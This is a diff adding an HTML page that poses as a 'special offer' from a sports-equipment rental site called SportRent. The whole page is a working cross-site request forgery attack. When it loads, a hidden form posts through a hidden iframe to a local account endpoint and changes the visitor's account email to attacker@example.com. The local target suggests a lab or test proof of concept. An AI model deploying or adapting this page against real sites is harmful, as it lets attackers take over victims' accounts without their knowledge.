@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="pl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>SportRent — oferta specjalna</title>
+    <style>
+      body { font: 18px/1.5 system-ui, sans-serif; max-width: 42rem; margin: 12vh auto; padding: 0 1.5rem; color: #173042; }
+      .card { padding: 2rem; border: 1px solid #c9d7df; border-radius: 1rem; box-shadow: 0 12px 32px #17304212; }
+      h1 { margin-top: 0; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Oferta specjalna</h1>
+      <p>Sprawdzamy dostępne promocje na wypożyczenie sprzętu.</p>
+    </div>
+
+    <iframe name="delivery" hidden title=""></iframe>
+    <form id="offer" action="http://127.0.0.1:8000/auth/account/email" method="post" target="delivery" hidden>
+      <input name="email" value="attacker@example.com" />
+    </form>
+    <script>
+      window.addEventListener('load', () => document.getElementById('offer').submit());
+    </script>
+  </body>
+</html>
